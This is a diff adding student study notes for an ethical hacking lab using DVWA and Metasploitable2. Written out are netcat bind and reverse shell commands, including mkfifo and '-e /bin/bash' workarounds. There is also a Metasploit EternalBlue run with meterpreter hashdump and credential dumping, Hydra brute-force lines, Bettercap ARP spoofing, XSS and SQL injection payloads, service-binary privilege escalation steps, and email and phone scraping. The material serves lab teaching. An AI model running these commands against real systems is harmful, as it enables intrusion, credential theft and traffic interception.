@@ -1,0 +1,300 @@
+# Ethical Hacking Lab — Additional Notes & Breakdowns
+
+Supplementary to `ethical-hacking-lab-prep.md` — covers deeper explanations, command breakdowns, and troubleshooting discussed after the main guide.
+
+---
+
+## Nmap scan type differences (TCP / SYN / FIN)
+
+| Scan | How it detects open port | Reliability | Stealth | Needs sudo |
+|---|---|---|---|---|
+| `-sT` (Connect) | Full 3-way handshake completes | Very reliable | None (fully logged) | No |
+| `-sS` (SYN) | SYN-ACK received, then RST sent (never completes) | Reliable | Moderate (half-open) | Yes |
+| `-sF` (FIN) | No response to FIN = open; RST = closed | Less reliable (ambiguous) | High (evades basic filters) | Yes |
+
+Note: `-sF` doesn't work reliably against Windows targets — Windows doesn't follow the expected RFC behavior.
+
+---
+
+## Docker troubleshooting
+
+**`docker ps -a` not `docker ps a`** — needs the dash, or it errors "accepts no arguments."
+
+**Permission denied on docker.sock:**
+```
+sudo docker ps -a                        # quick fix, use sudo every time
+sudo usermod -aG docker $USER            # permanent fix — log out/in after
+```
+
+**Always include the port mapping** or you can't reach DVWA in browser:
+```
+sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
+```
+Without `-p 80:80`, DVWA runs but nothing is exposed to your host machine.
+
+**Getting DVWA's/container's IP:**
+- From Kali's own browser: just use `127.0.0.1` (your port mapping already covers this)
+- Container-internal IP (rarely needed): `sudo docker inspect -f '{{.NetworkSettings.IPAddress}}' <container-name>`
+- For another VM to reach DVWA: use **Kali's own IP** (`ip a`), not Docker's internal IP
+
+---
+
+## Nessus setup gotchas
+
+- Must use `https://localhost:8834` — not `http://` (you'll get a "Bad Request" otherwise)
+- Browser will warn "not secure" (self-signed cert) — click Advanced → Proceed anyway
+- Choose **Nessus Essentials** (free, register at tenable.com/products/nessus/nessus-essentials with name+email → emailed activation code)
+- If the install wizard only shows paid tiers (Expert/Professional/Manager) with no Essentials option: select any option on that screen, then paste your free Essentials activation code when prompted — the code itself determines your actual tier, regardless of what was clicked
+
+**`sudo dpkg -i Nessus-*.deb`**
+- `dpkg` = Debian's low-level package installer (installs a local .deb file directly, no internet dependency resolution like `apt`)
+- `-i` = install flag
+- `Nessus-*.deb` = wildcard matching the actual versioned filename
+- If it errors "cannot access archive" — check `ls ~/Downloads`, the file is probably there, not in your current folder. Also make sure it's an actual `.deb` file, not an accidentally-extracted folder (a `.deb` should show as a single file icon, not a folder with DEBIAN/opt subfolders)
+
+---
+
+## What is a daemon (service ending in "d")
+
+A **daemon** is a background program with no user interface — it just runs continuously, waiting to respond to events (connections, requests, scheduled triggers). The `d` suffix (`nessusd`, `sshd`, `crond`) stands for "daemon."
+
+**Why daemons are used:**
+- Services need to be always-on and ready, not manually launched each time
+- They keep running after you log out/close your terminal
+- Multiple users/processes can talk to one shared daemon (e.g. `dockerd` manages all containers for everyone)
+- Efficient — mostly idle until triggered by an actual event
+
+This is why `sudo systemctl start nessusd` is required before the web UI at `:8834` works — the UI is just a frontend; the daemon is the actual engine doing the work.
+
+---
+
+## Metasploit — full workflow explained
+
+**Core 5-step pattern, same for every exploit:**
+```
+search <keyword>
+use <exploit-path>
+show options
+set <OPTION> <value>
+run / exploit
+```
+
+**Full example:**
+```
+msfconsole
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS <target-ip>
+set LHOST <kali-ip>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+```
+
+**Key terms:**
+- `RHOSTS` = target machine(s)
+- `LHOST` = your Kali IP (where reverse shell connects back to)
+- **Meterpreter** = advanced post-exploitation shell (far more capable than plain cmd/bash)
+- `reverse_tcp` = target connects out to attacker (bypasses most firewalls — outbound rarely blocked)
+- `bind_tcp` = attacker connects into target directly (needs inbound port open, rarer)
+- `run` and `exploit` do the exact same thing (`exploit` is the older command name)
+
+**Post-exploitation commands once you have a meterpreter session:**
+```
+sysinfo          # target OS info
+getuid           # current privilege level
+screenshot       # capture target's screen
+hashdump         # dump password hashes
+load kiwi        # load Mimikatz module
+creds_all        # dump plaintext creds (after loading kiwi)
+shell            # drop into normal cmd/bash on target
+background       # pause session, return to msf6 prompt
+sessions -l      # list active sessions
+sessions -i 1    # resume session #1
+```
+
+---
+
+## Netcat backdoor — concept + troubleshooting
+
+**Bind shell (listener on target, attacker connects in):**
+```
+# On target:
+nc -lvp 4444 -e /bin/bash
+# On Kali:
+nc <target-IP> 4444
+```
+- `-l` listen, `-v` verbose, `-p 4444` port, `-e /bin/bash` execute shell on connect
+
+**Reverse shell (listener on attacker, target connects out — more realistic/common):**
+```
+# On Kali:
+nc -lvp 4444
+# On target:
+nc <kali-IP> 4444 -e /bin/bash
+```
+
+**If `-e` doesn't work on Metasploitable2** (many modern `nc` builds strip `-e` for security):
+Check first:
+```
+nc -h     # see if -e even appears
+```
+
+**Fix 1 — mkfifo workaround (manually recreates `-e` behavior):**
+```
+mkfifo /tmp/backpipe
+nc -lvp 4444 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
+```
+Connect from Kali exactly the same as before.
+
+**Fix 2 — try ncat (Nmap's netcat, usually keeps `-e`):**
+```
+ncat -lvp 4444 -e /bin/bash
+```
+
+**Fix 3 — try nc.traditional (Debian keeps the old build with `-e` intact):**
+```
+nc.traditional -lvp 4444 -e /bin/bash
+```
+
+**Viva one-liner:** *"A bind shell has the backdoor binding to a port on the target and waiting — the attacker initiates the connection. This demonstrates how a planted backdoor allows unauthenticated remote command execution."*
+
+---
+
+## SNMP enumeration — full explanation
+
+**What SNMP is:** Simple Network Management Protocol — used to remotely monitor/manage network devices. Runs on **UDP port 161**.
+
+**What a "community string" is:** basically a shared password (just a text string) instead of a real username+password login. Defaults are almost always:
+- `public` → read-only access
+- `private` → read-write access (far more dangerous if left default)
+
+**Steps:**
+```
+sudo apt install snmp onesixtyone -y
+sudo nmap -sU -p 161 <target-IP>                          # confirm SNMP is open
+onesixtyone <target-IP> public                             # test/guess community string
+snmpwalk -v1 -c public <target-IP>                         # full enumeration dump
+snmpwalk -v1 -c public <target-IP> 1.3.6.1.2.1.1            # system info branch only
+```
+
+**What the leaked info enables:**
+- System description/version → attacker searches matching CVEs/exploits
+- Network interfaces/routing → maps internal network, finds pivot targets
+- Running processes/software → matches to known exploits
+- Usernames (esp. Windows SNMP) → direct input for Hydra brute-forcing
+- `private` string → read-write access, can actually reconfigure the device
+
+**Viva one-liner:** *"SNMP enumeration is a reconnaissance step — it doesn't grant access directly, but leaked system/network details let an attacker build a targeted attack instead of guessing blindly."*
+
+---
+
+## Bettercap (ARP spoofing / MITM)
+
+**Concept:** ARP has no authentication — any device can falsely claim to be another IP. Bettercap exploits this to sit between two devices (e.g. target + router) and intercept their traffic.
+
+```
+sudo apt install bettercap -y
+sudo bettercap -iface eth0
+> net.probe on                        # discover live hosts
+> net.show                            # list discovered hosts
+> set arp.spoof.targets <target-IP>   # pick target
+> arp.spoof on                        # start MITM
+> net.sniff on                        # capture traffic
+> arp.spoof off                       # clean shutdown
+> net.sniff off
+> quit
+```
+
+**Viva one-liner:** *"Bettercap performs ARP spoofing to position the attacker's machine between two hosts, tricking both into routing traffic through the attacker — enabling sniffing or manipulation of unencrypted traffic."*
+
+---
+
+## Hydra — full flag breakdown
+
+```
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<target-IP>
+```
+- `-l` (lowercase) = single username
+- `-L` (uppercase) = file of multiple usernames
+- `-P` (uppercase) = password **list** file
+- `-p` (lowercase) = single password
+- `ssh://<IP>` = protocol + target combined
+
+**Hydra against DVWA's login form specifically:**
+1. Set DVWA security to Low
+2. Grab your session cookie (DevTools → Application → Cookies → `PHPSESSID`)
+3. Run:
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed:H=Cookie: PHPSESSID=<cookie>; security=low"
+```
+- `^USER^` / `^PASS^` = placeholders Hydra fills from your username/wordlist
+- `Login failed` = the failure string Hydra uses to detect a wrong attempt
+- `H=Cookie:...` = passes your session cookie + security level
+
+**Against DVWA's dedicated Brute Force module (GET-based instead of POST):**
+```
+hydra -l admin -P quickpass.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: PHPSESSID=<cookie>; security=low"
+```
+
+**Faster demo — small custom wordlist instead of full rockyou.txt:**
+```
+echo -e "123456\npassword\nadmin" > quickpass.txt
+```
+DVWA's actual default password is `password` — cracks instantly.
+
+---
+
+## Exploit weak Windows file permissions for privilege escalation — theoretical steps
+
+1. **Gain initial low-privilege access** on the Windows target
+2. **Enumerate running services**, especially ones running as SYSTEM
+3. **Check file/folder permissions** on each service's executable — look for "Full Control," "Modify," or "Write" granted to broad groups (Everyone, Authenticated Users, Users) instead of being restricted to Administrators/SYSTEM
+4. **Identify a vulnerable service** — one that runs as SYSTEM AND has a modifiable executable
+5. **Prepare a malicious payload** (e.g. a reverse shell executable)
+6. **Replace the legitimate service binary** with the malicious payload, keeping the same filename
+7. **Set up a listener** on the attacker machine to catch the callback
+8. **Restart the service** (or wait for reboot) — Windows executes the file with the *service's* assigned privilege level, not the modifier's
+9. **Confirm escalation** — new session should show SYSTEM-level privileges instead of the original low-privilege user
+
+**Underlying principle:** Windows trusts a service's binary regardless of who last modified it. If file permissions are too permissive, a low-privilege attacker can hijack what the system executes with elevated trust — turning a file-write bug into full SYSTEM access.
+
+**Linux equivalent (for comparison):** same root cause as SUID privilege escalation — a privileged process trusting a file a low-privilege user can modify.
+
+---
+
+## OWASP Top 10 — mapped to DVWA modules
+
+| OWASP Category | DVWA Module | Demo Payload |
+|---|---|---|
+| Injection (A03) | SQL Injection | `' OR '1'='1` |
+| Broken Authentication (A07) | Brute Force | Hydra against login form |
+| XSS (A03 family) | XSS Reflected/Stored/DOM | `<script>alert(document.cookie)</script>` |
+| Broken Access Control (A01) | File Inclusion | Modify URL param to access unauthorized files |
+| Security Misconfiguration (A05) | DVWA Security Level setting | Switching Impossible→Low reintroduces all vulns |
+| Vulnerable Components (A06) | N/A — scan the stack | `nikto -h http://127.0.0.1` flags outdated PHP/Apache |
+| CSRF | CSRF module | Hidden form auto-submitting password change |
+| Logging/Monitoring Failures (A09) | Apache logs | `cat /var/log/apache2/access.log \| grep script` — no alerting occurred |
+| Insecure Design (A04) | DVWA itself | Architecturally built without input validation/parameterized queries |
+| Data Integrity Failures (A08) | File Upload | Upload unverified PHP webshell |
+
+---
+
+## Collecting emails/phone numbers via OSINT (slip-specific)
+
+```
+theHarvester -d example.com -b bing,crtsh -l 100          # emails/subdomains
+
+# Google dorks (run directly in search bar):
+site:example.com "@example.com"
+site:example.com intext:"contact" "phone"
+
+# Extract from page source directly:
+wget -q -O - http://example.com | grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+wget -q -O - http://example.com | grep -Eo '\+?[0-9][0-9() -]{8,}[0-9]'
+
+# Or just check manually:
+# /contact, /about, /team pages — view source, search for mailto: and tel:
+```
+
+Maltego also works well for a visual demo: Domain entity → "To Email addresses [SMTP]" / "To Phone numbers" transforms.
